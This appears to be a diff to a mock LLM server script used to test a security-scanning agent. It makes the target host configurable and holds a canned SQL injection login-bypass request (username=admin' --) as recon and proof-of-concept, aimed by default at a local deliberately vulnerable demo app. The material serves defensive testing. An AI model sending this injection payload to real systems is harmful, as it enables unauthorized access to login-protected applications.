@@ -14,8 +14,12 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 LOG_PATH = "/tmp/mock_llm/requests.jsonl"
 state = {"n": 0}
 
+# 対象(host:port)は第2引数で指定できる(既定: 127.0.0.1:5000、このリポジトリ自身のsqli-labデモアプリ)。
+# local_scan_server.py の /scan/strix が、netcheck/zgrab2と同じ許可範囲チェックを通した上で渡す。
+TARGET = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1:5000"
+
 RECON_CMD = (
-    "curl -s 'http://127.0.0.1:5000/login?username=admin%27%20--&password=x'"
+    "curl -s 'http://" + TARGET + "/login?username=admin%27%20--&password=x'"
 )
 
 REPORT_ARGS = {
@@ -60,9 +64,9 @@ REPORT_ARGS = {
         "generic application bug."
     ),
     "poc_script_code": (
-        "curl -s 'http://127.0.0.1:5000/login?username=admin%27%20--&password=x'\n"
+        "curl -s 'http://" + TARGET + "/login?username=admin%27%20--&password=x'\n"
         "# -> 200 'Login OK ... Rows: [(3, 'admin', 1)]'\n\n"
-        "curl -s 'http://127.0.0.1:5000/login?username=nope&password=nope'\n"
+        "curl -s 'http://" + TARGET + "/login?username=nope&password=nope'\n"
         "# -> 401 'Login failed'"
     ),
     "remediation_steps": (
